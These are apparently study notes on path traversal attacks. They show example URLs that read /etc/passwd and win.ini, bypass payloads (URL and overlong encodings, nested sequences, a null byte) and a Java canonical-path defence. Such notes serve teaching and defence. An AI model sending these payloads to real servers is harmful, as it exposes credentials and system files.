# Path Traversal

## What is Path Traversal (Directory Traversal)
Enables attacker to read arbitrary files on the server that is running an application. 
This might include:
1. Application code and data.
2. Credentials for back-end systems.
3. Sensitive operating system files.
In some cases it might be poissible to write to arbitrary files on the server.

## How to exploit?
```HTML
<img src="/loadImage?filename=218.png">
An Attacker could instead change the filename parameter to point to another file or directory.

On linux for example:
https://insecure-website.com/loadImage?filename=../../../etc/passwd

On Windows:
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```


## Bypass Security Mechanism
- Use absolute path from filesystem root ```filename=/etc/passwd```
- Use nested travseral sequences ```....// or ....\/```
- Use URL encoding to bypass sanitization ```../ => %2e%2e%2f and %252e%252e%252f or non-standard encodings such as `..%c0%af` or `..%ef%bc%8f` ```
- Sometimes app requires user-supplied filename to start with expected base folder ``` /var/www/images``` In this case include required base folder ```/var/www/images/../../../etc/passwd```
- Sometimes file extension is required then add null byte to terminate file path before required extension ```filename=../../../etc/passwd%00.png```
## How to prevent?
Most effective way to prevent: Avoid passing user-supplied input to filesystem APIs.
Otherwise use two layers of defense:
- Validate user input before processing. Ideally compare the user input with a whitelist of permitted values. Or only permitt content such as alphanumeric characters.
- After validating the supplied input, append the input to the base directory and use platform filesystem apu to canonicalize the path.
```Java
File file = new File(BASE_DIRECTORY, userInput); 
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { 
	// process file 
}
```
